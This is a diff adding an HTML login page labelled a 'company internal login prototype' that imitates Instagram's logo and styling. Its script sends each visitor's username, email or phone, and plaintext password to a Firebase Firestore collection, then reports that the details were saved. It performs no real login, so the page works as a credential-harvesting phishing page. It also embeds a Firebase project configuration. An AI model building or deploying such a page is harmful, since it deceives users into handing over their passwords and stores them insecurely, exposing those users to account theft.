@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Company Login</title>
+  <style>
+    :root {
+      --bg: #fafafa;
+      --panel: #ffffff;
+      --border: #dbdbdb;
+      --text: #262626;
+      --muted: #737373;
+      --button: #0095f6;
+      --button-hover: #1877f2;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text);
+      padding: 20px;
+    }
+
+    .login-shell {
+      width: 100%;
+      max-width: 410px;
+    }
+
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 24px 26px;
+    }
+
+    .logo-wrap {
+      text-align: center;
+      margin-bottom: 18px;
+    }
+
+    .logo-wrap img {
+      width: 220px;
+      max-width: 100%;
+      border-radius: 12px;
+    }
+
+    .subtitle {
+      text-align: center;
+      margin: 0 0 20px;
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    form {
+      display: grid;
+      gap: 10px;
+    }
+
+    input {
+      width: 100%;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 11px 10px;
+      font-size: 14px;
+      background: #fafafa;
+      color: #222;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #a8a8a8;
+      background: #fff;
+    }
+
+    button {
+      margin-top: 4px;
+      background: var(--button);
+      color: white;
+      border: 0;
+      border-radius: 8px;
+      padding: 10px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    button:hover {
+      background: var(--button-hover);
+    }
+
+    button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .message {
+      margin-top: 12px;
+      min-height: 20px;
+      text-align: center;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .message.error {
+      color: #ed4956;
+    }
+
+    .message.success {
+      color: #2e7d32;
+    }
+
+    .foot {
+      text-align: center;
+      margin-top: 12px;
+      font-size: 12px;
+      color: var(--muted);
+    }
+  </style>
+</head>
+<body>
+  <main class="login-shell">
+    <section class="card">
+      <div class="logo-wrap">
+        <img src="C:/Users/dellb/.cursor/projects/c-Users-dellb-OneDrive-Pictures-Desktop-fire-base/assets/c__Users_dellb_AppData_Roaming_Cursor_User_workspaceStorage_fd68135048dbe5cc9c51e272df22dba1_images_Screenshot_2026-01-04_171611-038c8479-3f2b-4e87-833d-d912c7cbb2ec.png" alt="Instagram style logo">
+      </div>
+      <p class="subtitle">Company Access Portal</p>
+
+      <form id="loginForm">
+        <input type="text" id="username" placeholder="Username" required>
+        <input type="text" id="emailOrPhone" placeholder="Email or phone number" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit" id="submitBtn">Log in</button>
+      </form>
+
+      <div id="message" class="message" aria-live="polite"></div>
+    </section>
+    <p class="foot">Company internal login prototype</p>
+  </main>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-analytics.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyC-78ElMfZo3AFxN6VenIXLvMhgX11OWSU",
+      authDomain: "personal-c8771.firebaseapp.com",
+      projectId: "personal-c8771",
+      storageBucket: "personal-c8771.firebasestorage.app",
+      messagingSenderId: "1086998917175",
+      appId: "1:1086998917175:web:5137379f37731563d54fb2",
+      measurementId: "G-YGDTDPVREL"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    getAnalytics(app);
+    const db = getFirestore(app);
+
+    const form = document.getElementById("loginForm");
+    const submitBtn = document.getElementById("submitBtn");
+    const message = document.getElementById("message");
+
+    function showMessage(text, type) {
+      message.textContent = text;
+      message.className = "message " + type;
+    }
+
+    function isValidEmailOrPhone(value) {
+      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const phonePattern = /^\+?[0-9\s\-()]{7,20}$/;
+      return emailPattern.test(value) || phonePattern.test(value);
+    }
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+      showMessage("", "");
+
+      const payload = {
+        username: document.getElementById("username").value.trim(),
+        emailOrPhone: document.getElementById("emailOrPhone").value.trim(),
+        password: document.getElementById("password").value,
+        createdAt: serverTimestamp()
+      };
+
+      if (!isValidEmailOrPhone(payload.emailOrPhone)) {
+        showMessage("Enter a valid email or phone number.", "error");
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Saving...";
+
+      try {
+        await addDoc(collection(db, "companyLogins"), payload);
+        showMessage("Login details saved to Firebase successfully.", "success");
+        form.reset();
+      } catch (error) {
+        console.error(error);
+        showMessage("Could not save login details. Check Firebase rules/config.", "error");
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Log in";
+      }
+    });
+  </script>
+</body>
+</html>
